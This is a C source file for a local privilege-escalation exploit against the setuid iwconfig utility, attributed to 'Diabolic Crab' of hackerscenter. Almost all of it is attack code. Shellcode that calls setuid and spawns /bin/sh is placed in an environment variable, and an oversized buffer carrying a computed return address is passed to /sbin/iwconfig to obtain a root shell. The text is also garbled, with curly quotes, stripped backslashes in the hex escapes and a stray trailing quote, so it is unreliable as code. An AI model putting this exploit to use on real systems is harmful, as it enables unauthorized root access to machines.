//Diabolic Crab’s Local Root Exploit
///usr/sbin/iwconfig or /sbin/iwconfig
//dcrab@hackerscenter.com
//www.hackerscenter.com

#include <stdio.h>
#include <string.h>
#include <unistd.h>

char shellcode[]=
        ‘x31xc0x31xdbxb0x17xcdx80’ /* setuid() */
        ‘xebx5ax5ex31xc0x88x46x07x31xc0x31xdbxb0x27xcd’
        ‘x80x85xc0x78x32x31xc0x31xdbx66xb8x10x01xcdx80’
        ‘x85xc0x75x0fx31xc0x31xdbx50x8dx5ex05x53x56xb0’
        ‘x3bx50xcdx80x31xc0x8dx1ex89x5ex08x89x46x0cx50’
        ‘x8dx4ex08x51x56xb0x3bx50xcdx80x31xc0x8dx1ex89’
        ‘x5ex08x89x46x0cxb0x0bx89xf3x8dx4ex08x8dx56x0c’
        ‘xcdx80xe8xa1xffxffxffx2fx62x69x6ex2fx73x68’;

int main(int argc,char **argv){
   char buf[96];
   unsigned long ret;
   int i;

   char *prog[]={‘/sbin/iwconfig’,buf,NULL};
   char *env[]={‘EGG=’,shellcode,NULL};

   ret=0xc0000000-strlen(shellcode)-strlen(prog[0])-0x06;
   printf(‘use ret addr: 0x%xn’,ret);

   memset(buf,0x41,sizeof(buf));
   memcpy(&buf[92],&ret,4);

   execve(prog[0],prog,env);

  }’
